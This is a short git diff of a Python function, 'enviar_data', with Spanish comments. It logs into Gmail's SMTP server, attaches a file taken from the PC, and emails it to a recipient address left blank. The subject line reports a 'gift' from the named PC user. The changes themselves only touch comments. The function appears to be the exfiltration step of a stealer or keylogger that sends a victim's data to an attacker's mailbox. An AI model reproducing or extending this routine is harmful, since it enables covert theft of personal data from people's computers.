@@ -27,7 +27,7 @@ def enviar_data():
     SMTP_PORT = 587
     gmail_username = '' #agregar el correo remitente
     gmail_password = '' # key del correo remitente
-    # Crear objeto SMTP y establecer conexión
+    # objeto SMTP
     smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
     smtp.starttls()
 
@@ -41,9 +41,8 @@ def enviar_data():
     msg['From'] = gmail_username
     msg['To'] = '' #aqui agrega el correo donde se enviara
     msg['Subject'] = f"Acabas de recibir un gift desde el usuario del pc {usuario_pc}, abrelo"
-    # Agregar el cuerpo del mensaje
+    
     mensaje = f"Acabas de recibir un gift desde el usuario del pc {usuario_pc}, abrelo"
-    #mensaje = 'Hola, este es el contenido del correo.'
     msg.attach(MIMEText(mensaje, 'plain'))
     
     if archivo is not None:
@@ -59,5 +58,5 @@ def enviar_data():
             agregar_log(f"No se encontró el archivo: {archivo}")
     # Enviar el correo electrónico
     smtp.send_message(msg)
-    # Cerrar conexión SMTP
+    # Cerrar conexión 
     smtp.quit()
